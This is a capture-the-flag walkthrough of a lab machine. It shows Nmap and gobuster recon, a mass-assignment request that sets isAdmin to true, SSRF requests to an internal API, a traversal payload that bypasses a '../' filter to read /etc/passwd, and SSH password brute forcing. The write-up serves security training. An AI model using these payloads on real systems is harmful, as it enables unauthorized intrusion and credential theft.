## Goal

_“Even if it’s not accessible from the browser, can you still find a way to capture the flags and sneak into the secret admin panel?”_

#### Questions

- What is the flag value after logging in to the SysMon app?
- What is the content of the hidden text file in /var/www/html?

## Walkthrough

### Recon

I started by scanning the target with Nmap.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-25 11:32 UTC
Nmap scan report for ip-10-129-139-155.eu-west-3.compute.internal (10.129.139.155)
Host is up (0.0072s latency).
Not shown: 992 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp    open  smtp     Postfix smtpd
110/tcp   open  pop3     Dovecot pop3d
143/tcp   open  imap     Dovecot imapd (Ubuntu)
993/tcp   open  ssl/imap Dovecot imapd (Ubuntu)
995/tcp   open  ssl/pop3 Dovecot pop3d
4000/tcp  open  http     Node.js (Express middleware)
50000/tcp open  http     Apache httpd 2.4.41 ((Ubuntu))
Service Info: Host:  mail.filepath.lab; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

First, I tried to access `10.129.139.155:50000`, and it redirected me to the SysMon website, a restricted portal with a login page.

My first thought was to brute-force the login page since there was no rate limiting, but it didn’t work.

So I continued my recon with content discovery using `gobuster`:

bash

```bash
gobuster dir -u http://10.129.139.155:50000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The result:

bash

```bash
/templates            (Status: 301) [Size: 329]
/uploads              (Status: 301) [Size: 327]
/phpmyadmin           (Status: 403) [Size: 282]
/server-status        (Status: 403) [Size: 282]
```

After some exploring, I found nothing interesting.

So I shifted my focus to `http://10.129.139.155:4000/`, which has a login page that accepts the `guest:guest` credentials.

After logging in and going to my profile, I found something interesting: a `Recommend an Activity to guest` form that sends a POST request to the server and updates my profile details. At this point, I thought about **BOPLA (Broken Object Property Level Authorization)**.

<img width="790" height="457" alt="image" src="https://github.com/user-attachments/assets/99590b47-1d4c-4645-9dd3-334fbd7fa538" />


#### Privilege Escalation via BOPLA

I sent this request to change `isAdmin` to `true`:

```
POST /recommend-activity/1 HTTP/1.1
Host: 10.129.139.155:4000
...
activityType=isAdmin&activityName=true
```

<img width="1345" height="482" alt="image" src="https://github.com/user-attachments/assets/ec6029d7-ea9f-41b9-a613-d9aa6d538f26" />


The API and admin settings then appeared.

<img width="955" height="520" alt="image" src="https://github.com/user-attachments/assets/77e1e45f-f561-4c11-8998-4c55b24c2b68" />

#### SSRF

While exploring the admin settings, I found an input field that was vulnerable to SSRF.

<img width="918" height="451" alt="image" src="https://github.com/user-attachments/assets/605f44a1-2982-4e2a-891e-cc91f24ad72f" />

So I sent the following request in Burp:

```
POST /update-banner-image HTTP/1.1
Host: 10.129.139.155:4000
...
url=http://127.0.0.1:5000/internal-api
```

The result:

<img width="925" height="425" alt="image" src="https://github.com/user-attachments/assets/45ec4b26-3f49-43eb-8e8a-b21480aa2e0d" />

After decoding it with Base64:

<img width="997" height="304" alt="image" src="https://github.com/user-attachments/assets/6d11c8c1-4b11-4780-b856-dd82a2e3b4e5" />

Based on the API documentation, I then sent this request to retrieve the username and password for the SysMon app:

```
POST /update-banner-image HTTP/1.1
Host: 10.129.139.155:4000
...
url=http://127.0.0.1:5000/getAllAdmins101099991
```

The result:

<img width="1189" height="302" alt="image" src="https://github.com/user-attachments/assets/13aaab36-56e6-4791-b153-fa7d819883e2" />

### Second Flag

After logging in to SysMon and getting the first flag, it was time to find the second one.

After some exploring, I found a potentially vulnerable endpoint:

<img width="651" height="208" alt="image" src="https://github.com/user-attachments/assets/c020ffcb-9f3d-4e60-83b2-bfb0f4f36d51" />

The `profile.php?img=profile.png` parameter looked vulnerable to LFI, which could be used to read the hidden text file. After trying many payloads, this one worked, because the filter strips `../` once (it is not applied recursively):

```
..././..././..././..././..././..././..././..././..././..././etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tryhackme:x:1001:1001:,,,:/home/tryhackme:/bin/bash
mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:114:121::/var/spool/postfix:/usr/sbin/nologin
dovecot:x:115:123:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
dovenull:x:116:124:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
joshua:x:1002:1002:,,,:/home/joshua:/bin/bash
charles:x:1003:1003:,,,:/home/charles:/bin/bash
```

Two interesting users stand out:

- `joshua`
- `charles`

Remembering the Nmap results, the SSH port is open, so I tried to connect to it.

I brute-forced both accounts and found that the password for both is `123456`.

I found the second flag in joshua’s account.
